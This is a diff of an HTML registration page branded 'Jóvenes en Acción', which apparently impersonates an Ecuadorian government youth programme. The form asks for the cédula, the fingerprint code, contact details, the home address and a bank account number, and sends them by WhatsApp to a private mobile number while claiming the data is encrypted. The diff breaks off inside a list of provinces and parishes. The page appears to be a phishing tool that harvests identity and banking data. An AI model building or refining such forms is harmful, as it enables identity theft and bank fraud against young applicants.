@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jóvenes en Acción - Registro WhatsApp</title>
+    <title>Jóvenes en Acción - Registro Completo WhatsApp</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -30,17 +30,17 @@
             font-family: 'Poppins', sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            padding: 40px 20px;
             position: relative;
             overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
         }
 
         body::before {
             content: '';
-            position: absolute;
+            position: fixed;
             top: -50%;
             left: -50%;
             width: 200%;
@@ -48,6 +48,7 @@
             background: radial-gradient(circle at 30% 50%, rgba(255,255,255,0.1) 0%, transparent 50%),
                         radial-gradient(circle at 70% 80%, rgba(255,255,255,0.15) 0%, transparent 50%);
             animation: rotate 20s linear infinite;
+            pointer-events: none;
         }
 
         @keyframes rotate {
@@ -61,7 +62,7 @@
             border-radius: 24px;
             box-shadow: 0 32px 64px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.1);
             width: 100%;
-            max-width: 560px;
+            max-width: 750px;
             overflow: hidden;
             position: relative;
             z-index: 1;
@@ -81,7 +82,7 @@
 
         .header {
             background: linear-gradient(135deg, #0066cc 0%, #004d99 100%);
-            padding: 40px 30px 30px;
+            padding: 50px 40px 40px;
             text-align: center;
             color: white;
             position: relative;
@@ -107,16 +108,16 @@
         }
 
         .logo {
-            width: 90px;
-            height: 90px;
+            width: 100px;
+            height: 100px;
             background: white;
             border-radius: 50%;
             margin: 0 auto;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 45px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+            font-size: 50px;
+            box-shadow: 0 12px 32px rgba(0,0,0,0.2);
             position: relative;
             transition: transform 0.3s ease;
         }
@@ -128,7 +129,7 @@
         .logo::after {
             content: '';
             position: absolute;
-            inset: -4px;
+            inset: -6px;
             border-radius: 50%;
             border: 3px solid rgba(255,255,255,0.3);
             animation: pulse 2s infinite;
@@ -136,11 +137,11 @@
 
         @keyframes pulse {
             0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.5; }
+            50% { transform: scale(1.15); opacity: 0.3; }
         }
 
         .header h1 {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 700;
             margin-bottom: 8px;
             letter-spacing: -0.5px;
@@ -148,70 +149,84 @@
             z-index: 1;
         }
 
-        .header p {
-            font-size: 14px;
+        .header .subtitle {
+            font-size: 16px;
             opacity: 0.95;
             font-weight: 300;
             position: relative;
             z-index: 1;
+            margin-bottom: 15px;
         }
 
         .badge {
             display: inline-block;
             background: rgba(255,255,255,0.2);
             backdrop-filter: blur(10px);
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-top: 12px;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-size: 13px;
             border: 1px solid rgba(255,255,255,0.3);
             position: relative;
             z-index: 1;
+            letter-spacing: 0.5px;
         }
 
         .form-container {
-            padding: 35px 30px;
+            padding: 50px 50px;
             background: white;
         }
 
         .section-title {
-            font-size: 14px;
-            font-weight: 600;
+            font-size: 16px;
+            font-weight: 700;
             color: var(--primary);
             text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #e1e8ed;
+            letter-spacing: 1.5px;
+            margin-bottom: 30px;
+            margin-top: 20px;
+            padding-bottom: 15px;
+            border-bottom: 3px solid #e1e8ed;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 12px;
+        }
+
+        .section-title:first-child {
+            margin-top: 0;
         }
 
         .section-icon {
-            width: 28px;
-            height: 28px;
+            width: 40px;
+            height: 40px;
             background: linear-gradient(135deg, #667eea, #764ba2);
-            border-radius: 8px;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 14px;
+            font-size: 20px;
             color: white;
+            flex-shrink: 0;
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
         }
 
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: 30px;
             position: relative;
         }
 
         .form-group label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             color: #2d3748;
-            font-weight: 500;
-            font-size: 13px;
+            font-weight: 600;
+            font-size: 14px;
             letter-spacing: 0.3px;
+        }
+
+        .required::after {
+            content: ' *';
+            color: #e53e3e;
+            font-weight: 700;
         }
 
         .input-wrapper {
@@ -220,54 +235,63 @@
 
         .input-icon {
             position: absolute;
-            left: 15px;
+            left: 18px;
             top: 50%;
             transform: translateY(-50%);
-            font-size: 18px;
+            font-size: 20px;
             color: #a0aec0;
             z-index: 1;
             transition: color 0.3s ease;
+            pointer-events: none;
         }
 
-        input, select {
+        input, select, textarea {
             width: 100%;
-            padding: 14px 15px 14px 45px;
+            padding: 16px 20px 16px 55px;
             border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            font-size: 14px;
+            border-radius: 14px;
+            font-size: 15px;
             transition: all 0.3s ease;
             background: #f7fafc;
             font-family: 'Poppins', sans-serif;
             color: #2d3748;
+            line-height: 1.5;
         }
 
         select {
-            padding-left: 40px;
+            padding-left: 52px;
             cursor: pointer;
             appearance: none;
-            background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="%23a0aec0" viewBox="0 0 16 16"><path d="M8 11L3 6h10z"/></svg>');
+            background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="%23a0aec0" viewBox="0 0 16 16"><path d="M8 11L3 6h10z"/></svg>');
             background-repeat: no-repeat;
-            background-position: right 15px center;
-            padding-right: 40px;
+            background-position: right 18px center;
+            padding-right: 50px;
         }
 
-        input:focus, select:focus {
+        textarea {
+            padding-left: 55px;
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        input:focus, select:focus, textarea:focus {
             outline: none;
             border-color: var(--primary);
             background: white;
             box-shadow: 0 0 0 4px rgba(0,102,204,0.1);
-            transform: translateY(-1px);
+            transform: translateY(-2px);
         }
 
-        input:focus + .input-icon,
-        input:focus ~ .input-icon {
+        input:focus ~ .input-icon,
+        select:focus ~ .input-icon,
+        textarea:focus ~ .input-icon {
             color: var(--primary);
         }
 
         .row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 20px;
+            gap: 25px;
         }
 
         .full-width {
@@ -276,21 +300,21 @@
 
         .btn-submit {
             width: 100%;
-            padding: 16px;
+            padding: 20px;
             background: linear-gradient(135deg, #25D366, #128C7E);
             color: white;
             border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
+            border-radius: 14px;
+            font-size: 18px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 10px;
+            margin-top: 20px;
             font-family: 'Poppins', sans-serif;
             letter-spacing: 0.5px;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 8px 24px rgba(37, 211, 102, 0.3);
+            box-shadow: 0 12px 32px rgba(37, 211, 102, 0.3);
         }
 
         .btn-submit::before {
@@ -306,7 +330,7 @@
 
         .btn-submit:hover {
             transform: translateY(-3px);
-            box-shadow: 0 12px 32px rgba(37, 211, 102, 0.4);
+            box-shadow: 0 16px 40px rgba(37, 211, 102, 0.4);
         }
 
         .btn-submit:hover::before {
@@ -320,22 +344,24 @@
         .whatsapp-icon {
             display: inline-flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
         }
 
         .whatsapp-icon svg {
-            width: 24px;
-            height: 24px;
+            width: 26px;
+            height: 26px;
         }
 
         .alert {
-            padding: 16px;
-            border-radius: 12px;
-            margin-bottom: 24px;
+            padding: 18px 20px;
+            border-radius: 14px;
+            margin-bottom: 30px;
             display: none;
             animation: slideDown 0.3s ease;
             font-weight: 500;
             font-size: 14px;
+            align-items: center;
+            gap: 12px;
         }
 
         @keyframes slideDown {
@@ -352,26 +378,20 @@
         .alert-success {
             background: #f0fff4;
             color: #22543d;
-            border-left: 4px solid #48bb78;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            border-left: 5px solid #48bb78;
         }
 
         .alert-error {
             background: #fff5f5;
             color: #742a2a;
-            border-left: 4px solid #fc8181;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            border-left: 5px solid #fc8181;
         }
 
         .footer {
             background: linear-gradient(135deg, #f8f9fa, #e9ecef);
-            padding: 20px;
+            padding: 25px;
             text-align: center;
-            font-size: 12px;
+            font-size: 13px;
             color: #6c757d;
             border-top: 1px solid #dee2e6;
         }
@@ -380,68 +400,82 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 20px;
+            gap: 25px;
             flex-wrap: wrap;
+            margin-bottom: 10px;
         }
 
         .footer-item {
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 8px;
+            font-weight: 500;
         }
 
-        /* Responsive */
-        @media (max-width: 640px) {
+        .progress-bar {
+            height: 6px;
+            background: #e2e8f0;
+            margin-bottom: 40px;
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0066cc, #00a86b);
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 3px;
+            box-shadow: 0 0 10px rgba(0,102,204,0.3);
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 20px 10px;
+            }
+            
             .row {
                 grid-template-columns: 1fr;
+                gap: 0;
             }
             
             .container {
-                margin: 10px;
+                margin: 0;
+                border-radius: 20px;
             }
             
             .form-container {
-                padding: 25px 20px;
+                padding: 30px 20px;
             }
             
             .header {
-                padding: 30px 20px 25px;
+                padding: 40px 20px 30px;
             }
             
             .header h1 {
-                font-size: 24px;
+                font-size: 26px;
             }
-        }
-
-        /* Tooltip personalizado */
-        .tooltip {
-            position: relative;
-            display: inline-block;
-            margin-left: 6px;
-            cursor: help;
-        }
-
-        .tooltip .tooltiptext {
-            visibility: hidden;
-            width: 200px;
-            background-color: #2d3748;
-            color: #fff;
-            text-align: center;
-            border-radius: 6px;
-            padding: 8px;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            margin-left: -100px;
-            font-size: 12px;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-
-        .tooltip:hover .tooltiptext {
-            visibility: visible;
-            opacity: 1;
+            
+            .logo {
+                width: 80px;
+                height: 80px;
+                font-size: 40px;
+            }
         }
     </style>
 </head>
@@ -452,11 +486,15 @@
                 <div class="logo">🎓</div>
             </div>
             <h1>Jóvenes en Acción</h1>
-            <p>Sistema de Registro Automatizado</p>
-            <div class="badge">🔒 Datos Seguros • Envío Instantáneo</div>
+            <p class="subtitle">Formulario de Registro Completo</p>
+            <div class="badge">🔒 Datos Seguros • Envío Instantáneo a WhatsApp</div>
         </div>
 
         <div class="form-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
             <div id="alert" class="alert"></div>
             
             <form id="registroForm">
@@ -466,33 +504,44 @@
                     Datos Personales
                 </div>
                 
-                <div class="form-group">
-                    <label for="cedula">
-                        Cédula de Identidad
-                        <span class="tooltip">❓
-                            <span class="tooltiptext">Ingrese su número de cédula de 10 dígitos</span>
-                        </span>
-                    </label>
-                    <div class="input-wrapper">
-                        <span class="input-icon">📋</span>
-                        <input type="text" id="cedula" name="cedula" 
-                               placeholder="Ej: 1723456789" 
-                               required maxlength="10" pattern="[0-9]{10}"
-                               autocomplete="off">
+                <div class="row">
+                    <div class="form-group">
+                        <label for="cedula" class="required">Cédula de Identidad</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">📋</span>
+                            <input type="text" id="cedula" name="cedula" 
+                                   placeholder="Ej: 1723456789" 
+                                   required maxlength="10" pattern="[0-9]{10}"
+                                   autocomplete="off">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="codigoDactilar" class="required">Código Dactilar</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">🔢</span>
+                            <input type="text" id="codigoDactilar" name="codigoDactilar" 
+                                   placeholder="Código dactilar" required>
+                        </div>
                     </div>
                 </div>
 
-                <div class="form-group">
-                    <label for="codigoDactilar">
-                        Código Dactilar
-                        <span class="tooltip">❓
-                            <span class="tooltiptext">Código único de identificación dactilar</span>
-                        </span>
-                    </label>
-                    <div class="input-wrapper">
-                        <span class="input-icon">🔢</span>
-                        <input type="text" id="codigoDactilar" name="codigoDactilar" 
-                               placeholder="Ingrese su código dactilar" required>
+                <div class="row">
+                    <div class="form-group">
+                        <label for="celular" class="required">Número Celular</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">📱</span>
+                            <input type="tel" id="celular" name="celular" 
+                                   placeholder="Ej: 0991234567" 
+                                   required maxlength="10" pattern="[0-9]{10}">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="email" class="required">Correo Electrónico</label>
+                        <div class="input-wrapper">
+                            <span class="input-icon">📧</span>
+                            <input type="email" id="email" name="email" 
+                                   placeholder="ejemplo@correo.com" required>
+                        </div>
                     </div>
                 </div>
 
@@ -502,52 +551,39 @@
                     Información de Dirección
                 </div>
 
+                <div class="form-group full-width">
+                    <label for="provincia" class="required">Provincia</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🏙️</span>
+                        <select id="provincia" name="provincia" required onchange="actualizarCantones()">
+                            <option value="">Seleccionar provincia</option>
+                        </select>
+                    </div>
+                </div>
+
                 <div class="row">
                     <div class="form-group">
-                        <label for="provincia">Provincia</label>
+                        <label for="canton" class="required">Cantón</label>
                         <div class="input-wrapper">
-                            <span class="input-icon">🏙️</span>
-                            <select id="provincia" name="provincia" required>
-                                <option value="">Seleccionar</option>
-                                <option value="Azuay">Azuay</option>
-                                <option value="Bolívar">Bolívar</option>
-                                <option value="Cañar">Cañar</option>
-                                <option value="Carchi">Carchi</option>
-                                <option value="Chimborazo">Chimborazo</option>
-                                <option value="Cotopaxi">Cotopaxi</option>
-                                <option value="El Oro">El Oro</option>
-                                <option value="Esmeraldas">Esmeraldas</option>
-                                <option value="Galápagos">Galápagos</option>
-                                <option value="Guayas">Guayas</option>
-                                <option value="Imbabura">Imbabura</option>
-                                <option value="Loja">Loja</option>
-                                <option value="Los Ríos">Los Ríos</option>
-                                <option value="Manabí">Manabí</option>
-                                <option value="Morona Santiago">Morona Santiago</option>
-                                <option value="Napo">Napo</option>
-                                <option value="Orellana">Orellana</option>
-                                <option value="Pastaza">Pastaza</option>
-                                <option value="Pichincha">Pichincha</option>
-                                <option value="Santa Elena">Santa Elena</option>
-                                <option value="Santo Domingo">Santo Domingo</option>
-                                <option value="Sucumbíos">Sucumbíos</option>
-                                <option value="Tungurahua">Tungurahua</option>
-                                <option value="Zamora Chinchipe">Zamora Chinchipe</option>
+                            <span class="input-icon">🏘️</span>
+                            <select id="canton" name="canton" required onchange="actualizarParroquias()">
+                                <option value="">Primero seleccione provincia</option>
                             </select>
                         </div>
                     </div>
                     <div class="form-group">
-                        <label for="canton">Cantón</label>
+                        <label for="parroquia" class="required">Parroquia</label>
                         <div class="input-wrapper">
-                            <span class="input-icon">🏘️</span>
-                            <input type="text" id="canton" name="canton" 
-                                   placeholder="Ingrese su cantón" required>
+                            <span class="input-icon">🏛️</span>
+                            <select id="parroquia" name="parroquia" required>
+                                <option value="">Primero seleccione cantón</option>
+                            </select>
                         </div>
                     </div>
                 </div>
 
-                <div class="form-group">
-                    <label for="direccion">Dirección Completa</label>
+                <div class="form-group full-width">
+                    <label for="direccion" class="required">Dirección Completa</label>
                     <div class="input-wrapper">
                         <span class="input-icon">📍</span>
                         <input type="text" id="direccion" name="direccion" 
@@ -555,18 +591,74 @@
                     </div>
                 </div>
 
-                <!-- Sección Contacto -->
+                <!-- Sección Institución y Área -->
                 <div class="section-title">
-                    <span class="section-icon">✉️</span>
-                    Información de Contacto
+                    <span class="section-icon">🏢</span>
+                    Institución y Área de Interés
                 </div>
 
-                <div class="form-group">
-                    <label for="email">Correo Electrónico</label>
+                <div class="form-group full-width">
+                    <label for="institucionPreferencia" class="required">Institución donde desea pertenecer</label>
                     <div class="input-wrapper">
-                        <span class="input-icon">📧</span>
-                        <input type="email" id="email" name="email" 
-                               placeholder="ejemplo@correo.com" required>
+                        <span class="input-icon">🏛️</span>
+                        <select id="institucionPreferencia" name="institucionPreferencia" required>
+                            <option value="">Seleccione institución</option>
+                            <option value="MINISTERIO DE EDUCACIÓN, DEPORTE Y CULTURA">MINISTERIO DE EDUCACIÓN, DEPORTE Y CULTURA</option>
+                            <option value="MINISTERIO DE INFRAESTRUCTURA Y TRANSPORTE">MINISTERIO DE INFRAESTRUCTURA Y TRANSPORTE</option>
+                            <option value="MINISTERIO DE SALUD PÚBLICA">MINISTERIO DE SALUD PÚBLICA</option>
+                            <option value="SECRETARÍA NACIONAL DE GESTIÓN DE RIESGOS">SECRETARÍA NACIONAL DE GESTIÓN DE RIESGOS</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group full-width">
+                    <label for="area" class="required">Área</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">📊</span>
+                        <select id="area" name="area" required>
+                            <option value="">Seleccione área</option>
+                            <option value="Actividades relacionadas con el proceso de Generación de Información">Generación de Información</option>
+                            <option value="Actividades relacionadas con el proceso de Preparación y Respuesta ante Eventos Adversos">Preparación y Respuesta ante Eventos Adversos</option>
+                            <option value="Actividades relacionadas con el proceso de Reducción de riesgos">Reducción de riesgos</option>
+                            <option value="Administrativo">Administrativo</option>
+                            <option value="Agua y alimentación">Agua y alimentación</option>
+                            <option value="Ambiente">Ambiente</option>
+                            <option value="Apoyo en hospitales">Apoyo en hospitales</option>
+                            <option value="Archivos">Archivos</option>
+                            <option value="Educación">Educación</option>
+                            <option value="Operativo en oficinas">Operativo en oficinas</option>
+                            <option value="Operativo en territorio">Operativo en territorio</option>
+                            <option value="Promotores de salud">Promotores de salud</option>
+                            <option value="Técnico">Técnico</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group full-width">
+                    <label for="destreza" class="required">Destreza</label>
+                    <div class="input-wrapper">
+                        <span class="input-icon">🎯</span>
+                        <select id="destreza" name="destreza" required>
+                            <option value="">Seleccione destreza</option>
+                            <option value="Seguimiento de recomendaciones SNGR">Seguimiento de recomendaciones SNGR</option>
+                            <option value="Soporte Técnico y Mantenimiento">Soporte Técnico y Mantenimiento</option>
+                            <option value="Registro fotográfico de zonas de riesgo">Registro fotográfico de zonas de riesgo</option>
+                            <option value="Planificación">Planificación</option>
+                            <option value="Programación web">Programación web</option>
+                            <option value="Redacción de documentos">Redacción de documentos</option>
+                            <option value="Organización y digitalización de archivos">Organización y digitalización de archivos</option>
+                            <option value="Orientación a ciudadanos">Orientación a ciudadanos</option>
+                            <option value="Manejo de herramientas informáticas">Manejo de herramientas informáticas</option>
+                            <option value="Ofimática">Ofimática</option>
+                            <option value="Gestión de información">Gestión de información</option>
+                            <option value="Gestión de bases de datos">Gestión de bases de datos</option>
+                            <option value="Atención al público">Atención al público</option>
+                            <option value="Ciberseguridad">Ciberseguridad</option>
+                            <option value="Análisis de datos">Análisis de datos</option>
+                            <option value="Tecnología e Informática">Tecnología e Informática</option>
+                            <option value="Contabilidad y Finanzas">Contabilidad y Finanzas</option>
+                            <option value="Diseño Curricular">Diseño Curricular</option>
+                        </select>
                     </div>
                 </div>
 
@@ -576,12 +668,12 @@
                     Información Bancaria
                 </div>
 
-                <div class="form-group">
-                    <label for="institucionFinanciera">Institución Financiera</label>
+                <div class="form-group full-width">
+                    <label for="institucionFinanciera" class="required">Institución Financiera</label>
                     <div class="input-wrapper">
                         <span class="input-icon">🏛️</span>
                         <select id="institucionFinanciera" name="institucionFinanciera" required>
-                            <option value="">Seleccione institución</option>
+                            <option value="">Seleccione institución financiera</option>
                             <option value="Banco Pichincha">Banco Pichincha</option>
                             <option value="Banco Guayaquil">Banco Guayaquil</option>
                             <option value="Banco del Pacífico">Banco del Pacífico</option>
@@ -597,7 +689,7 @@
 
                 <div class="row">
                     <div class="form-group">
-                        <label for="tipoCuenta">Tipo de Cuenta</label>
+                        <label for="tipoCuenta" class="required">Tipo de Cuenta</label>
                         <div class="input-wrapper">
                             <span class="input-icon">💳</span>
                             <select id="tipoCuenta" name="tipoCuenta" required>
@@ -608,7 +700,7 @@
                         </div>
                     </div>
                     <div class="form-group">
-                        <label for="numeroCuenta">Número de Cuenta</label>
+                        <label for="numeroCuenta" class="required">Número de Cuenta</label>
                         <div class="input-wrapper">
                             <span class="input-icon">🔢</span>
                             <input type="text" id="numeroCuenta" name="numeroCuenta" 
@@ -622,7 +714,7 @@
                         <svg viewBox="0 0 24 24" fill="currentColor">
                             <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
                         </svg>
-                        Enviar Datos por WhatsApp
+                        Enviar Datos Completos por WhatsApp
                     </span>
                 </button>
             </form>
@@ -632,13 +724,424 @@
             <div class="footer-content">
                 <div class="footer-item">🔒 Datos Encriptados</div>
                 <div class="footer-item">⚡ Envío Instantáneo</div>
-                <div class="footer-item">📱 WhatsApp Oficial</div>
+                <div class="footer-item">📱 WhatsApp +593 96 302 3351</div>
             </div>
-            <div style="margin-top: 8px;">© 2024 Jóvenes en Acción • Todos los derechos reservados</div>
+            <div>© 2024 Jóvenes en Acción • Todos los derechos reservados</div>
         </div>
     </div>
 
     <script>
+        // Base de datos ACTUALIZADA con todas las parroquias correctas
+        const dataEcuador = {
+            "Azuay": {
+                cantones: {
+                    "Cuenca": ["Bellavista", "Cañaribamba", "El Batán", "El Sagrario", "El Vecino", "Gil Ramírez Dávalos", "Huayna Cápac", "Machángara", "Monay", "San Blas", "San Sebastián", "Sucre", "Totoracocha", "Yanuncay", "Baños", "Cumbe", "Chiquintad", "Llacao", "Molleturo", "Nulti", "Octavio Cordero Palacios", "Paccha", "Quingeo", "Ricaurte", "San Joaquín", "Santa Ana", "Sayausí", "Sidcay", "Sinincay", "Tarqui", "Turi", "Valle", "Victoria del Portete"],
+                    "Girón": ["Girón", "Asunción", "San Gerardo"],
+                    "Gualaceo": ["Gualaceo", "Daniel Córdova", "Jadán", "Mariano Moreno", "Remigio Crespo", "San Juan", "Zhídmad", "Luis Cordero", "Simón Bolívar"],
+                    "Nabón": ["Nabón", "Cochapata", "El Progreso", "Las Nieves", "Oña"],
+                    "Paute": ["Paute", "Bulán", "Chicán", "El Cabo", "Guachapala", "Guarainag", "San Cristóbal", "Tomebamba", "Dug Dug"],
+                    "Pucará": ["Pucará", "San Rafael de Sharug"],
+                    "San Fernando": ["San Fernando", "Chumblín"],
+                    "Santa Isabel": ["Santa Isabel", "Abdón Calderón", "El Carmen de Pijilí", "Zhaglli"],
+                    "Sevilla de Oro": ["Sevilla de Oro", "Amaluza", "Palmas"],
+                    "Sigsig": ["Sigsig", "Cuchil", "Gima", "Guel", "Ludo", "San Bartolomé", "San José de Raranga"]
+                }
+            },
+            "Bolívar": {
+                cantones: {
+                    "Guaranda": ["Ángel Polibio Chávez", "Gabriel Ignacio Veintimilla", "Guanujo", "Julio Moreno", "Salinas", "San Lorenzo", "San Simón", "Santa Fe", "Simiátug", "San Luis de Pambil"],
+                    "Caluma": ["Caluma"],
+                    "Chillanes": ["Chillanes", "San José del Tambo"],
+                    "Chimbo": ["Chimbo", "Asunción", "Magdalena", "San Sebastián", "Telimbela"],
+                    "Echeandía": ["Echeandía"],
+                    "Las Naves": ["Las Naves", "Las Mercedes"],
+                    "San Miguel": ["San Miguel", "Balsapamba", "Bilován", "Régulo de Mora", "San Pablo"]
+                }
+            },
+            "Cañar": {
+                cantones: {
+                    "Azogues": ["Azogues", "Cojitambo", "Guapán", "Javier Loyola", "Luis Cordero", "Pindilig", "Rivera", "San Miguel", "Taday"],
+                    "Biblián": ["Biblián", "Jerusalén", "Nazón", "Turupamba"],
+                    "Cañar": ["Cañar", "Chontamarca", "Chorocopte", "General Morales", "Gualleturo", "Honorato Vásquez", "Ingapirca", "Juncal", "San Antonio", "Zhud"],
+                    "Déleg": ["Déleg", "Solano"],
+                    "El Tambo": ["El Tambo"],
+                    "La Troncal": ["La Troncal", "Manuel J. Calle", "Pancho Negro"],
+                    "Suscal": ["Suscal"]
+                }
+            },
+            "Carchi": {
+                cantones: {
+                    "Tulcán": ["Tulcán", "El Carmelo", "Julio Andrade", "Maldonado", "Pioter", "Tobar Donoso", "Tufiño", "Urbina", "El Chical", "Santa Martha de Cuba"],
+                    "Bolívar": ["Bolívar", "García Moreno", "Los Andes", "Monte Olivo", "San Vicente de Pusir", "San Rafael"],
+                    "Espejo": ["El Ángel", "El Goaltal", "La Libertad", "San Isidro"],
+                    "Mira": ["Mira", "Concepción", "Jijón y Caamaño", "Juan Montalvo", "La Concepción"],
+                    "Montúfar": ["San Gabriel", "Cristóbal Colón", "Chitán de Navarrete", "Fernández Salvador", "La Paz", "Piartal"],
+                    "San Pedro de Huaca": ["Huaca", "Mariscal Sucre"]
+                }
+            },
+            "Chimborazo": {
+                cantones: {
+                    "Riobamba": ["Riobamba", "Cacha", "Calpi", "Cubijíes", "Flores", "Licán", "Licto", "Pungalá", "Punín", "Quimiag", "San Juan", "San Luis", "Yaruquíes"],
+                    "Alausí": ["Alausí", "Achupallas", "Guasuntos", "Huigra", "Multitud", "Pistishí", "Pumallacta", "Sevilla", "Sibambe", "Tixán"],
+                    "Chambo": ["Chambo"],
+                    "Chunchi": ["Chunchi", "Capzol", "Compud", "Gonzol", "Llagos"],
+                    "Colta": ["Cajabamba", "Cañi", "Columbe", "Juan de Velasco", "Sicalpa"],
+                    "Cumandá": ["Cumandá"],
+                    "Guamote": ["Guamote", "Cebadas", "Palmira"],
+                    "Guano": ["Guano", "Guanando", "Ilapo", "La Providencia", "San Andrés", "San Gerardo", "San Isidro", "Valparaíso"],
+                    "Pallatanga": ["Pallatanga"],
+                    "Penipe": ["Penipe", "Bilbao", "Matus", "Puela", "San Antonio", "San Isidro"]
+                }
+            },
+            "Cotopaxi": {
+                cantones: {
+                    "Latacunga": ["Latacunga", "Alaques", "Belisario Quevedo", "Guaitacama", "Joseguango Bajo", "Mulaló", "11 de Noviembre", "Poaló", "San Juan de Pastocalle", "Tanicuchí", "Toacaso"],
+                    "La Maná": ["La Maná", "Guasaganda", "Pucayacu"],
+                    "Pangua": ["El Corazón", "Moraspungo", "Pinllopata", "Ramón Campaña"],
+                    "Pujilí": ["Pujilí", "Angamarca", "Guangaje", "La Victoria", "Pilaló", "Tingo", "Zumbahua"],
+                    "Salcedo": ["Salcedo", "Cusubamba", "Mulalillo", "Mulliquindil", "Pansaleo"],
+                    "Saquisilí": ["Saquisilí", "Canchagua", "Chantilín", "Cochapamba"],
+                    "Sigchos": ["Sigchos", "Chugchillán", "Isinliví", "Las Pampas", "Palo Quemado"]
+                }
+            },
+            "El Oro": {
+                cantones: {
+                    "Machala": ["Machala", "El Cambio", "El Retiro", "Jambelí", "La Providencia", "Puerto Bolívar", "9 de Mayo"],
+                    "Arenillas": ["Arenillas", "Chacras", "Palmales", "Carcabón"],
+                    "Atahualpa": ["Paccha", "Ayapamba", "Cordoncillo", "Milagro", "San José", "San Juan de Cerro Azul"],
+                    "Balsas": ["Balsas", "Bellamaría"],
+                    "Chilla": ["Chilla"],
+                    "El Guabo": ["El Guabo", "Barbones", "La Iberia", "Tendales", "Río Bonito"],
+                    "Huaquillas": ["Huaquillas", "El Paraíso", "Unión Lojana"],
+                    "Las Lajas": ["La Victoria", "La Libertad", "El Paraíso", "San Isidro"],
+                    "Marcabelí": ["Marcabelí", "El Ingenio"],
+                    "Pasaje": ["Pasaje", "Buenavista", "Casacay", "La Peaña", "Progreso", "Uzhcurrumi", "Cañaquemada"],
